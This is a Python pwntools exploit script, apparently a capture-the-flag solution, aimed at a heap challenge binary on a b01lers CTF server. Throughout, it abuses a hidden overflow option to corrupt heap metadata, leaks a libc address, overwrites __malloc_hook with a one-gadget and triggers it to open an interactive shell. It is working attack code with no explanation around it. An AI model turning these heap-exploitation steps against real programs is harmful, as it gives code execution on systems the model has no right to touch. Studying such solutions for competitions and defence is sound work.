#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapsoftrouble-25dc62650f966e6f47b50a0704f2c976", checksec=0)
libc = ELF("./libc.so.6", checksec=0)

context.binary = exe


def conn():
        return process([exe.path], env={"LD_PRELOAD": libc.path})

#r = conn()
r = remote("chal.ctf.b01lers.com", 1010)

sla = lambda a,b : r.sendlineafter(a, b)

def login(r, name):
    sla("Login: ", name)
    r.recv(1024)

def create(r, matrix, population, fake=0):
    r.sendline("1")
    sla("New Matrix: ", matrix)
    available_pop = r.recvline()
    if not fake:
        sla("Population to transfer to new matrix: ", str(population))

    r.recv(1024)

def delete(r, matrix, trigger=0):
    r.sendline("2")
    sla("Matrix: ", matrix)
    
    if not trigger:
        r.recv(1024)


def configure(r, matrix, pop):
    r.sendline("3")
    sla("Matrix: ", matrix)
    sla("New Population: ", str(pop))
    
    r.recv(1024)

def Overflow(r, data): #hidden option
    r.sendline("7")
    r.sendline(data)

    r.recv(1024)

def show_all(r):
    r.sendline("5")


def main():
    global r
    login(r, "MAHER")

    ## Start 
    delete(r, "Matrix #0")
    create(r, "Matrix M", 100)

    Overflow(r, p64(0)*5 + p64(0x5d1))
    
    delete(r, "Matrix #1")
   
    
    for i in range(4):
        Overflow(r, p64(0)*2)  


    show_all(r)

    r.recvuntil("Matrix []")
    r.recvuntil("Population: ")
    LIBC_LEAK = int(r.recvline().strip())

    log.warn("Libc leak @ 0x%x", LIBC_LEAK)

    libc.address = LIBC_LEAK - libc.sym['main_arena'] - 96

    log.warn("Libc base @ 0x%x", libc.address)

    r.recv(4096)
    
    binsh = next(libc.search(b"/bin/sh"))

    ####
    delete(r, "Matrix M")
    
    Overflow(r, p64(0)*3 + p64(binsh + 0x4))
    Overflow(r, p64(0)*3 + p64(binsh + 0x5))
    Overflow(r, p64(0)*3 + p64(binsh + 0x6))
    

    p = b"Matrix #5"
    p += b"\x00"*(8*3 - len(p))
    p += p64(binsh)
    delete(r, p)
    
   
    delete(r, "Matrix #6")
    Overflow(r, p64(0)*4 + p64(0) + p64(0x31) + p64(libc.sym['__malloc_hook']))
    Overflow(r, p64(0))
    Overflow(r, p64(libc.address + 0xc751d)[:-3:] + b"\x7f")
    

    r.recv(4096)

    delete(r, b"/bin/sh", 1) #trigger !
    
    r.interactive()


if __name__ == "__main__":
    main()
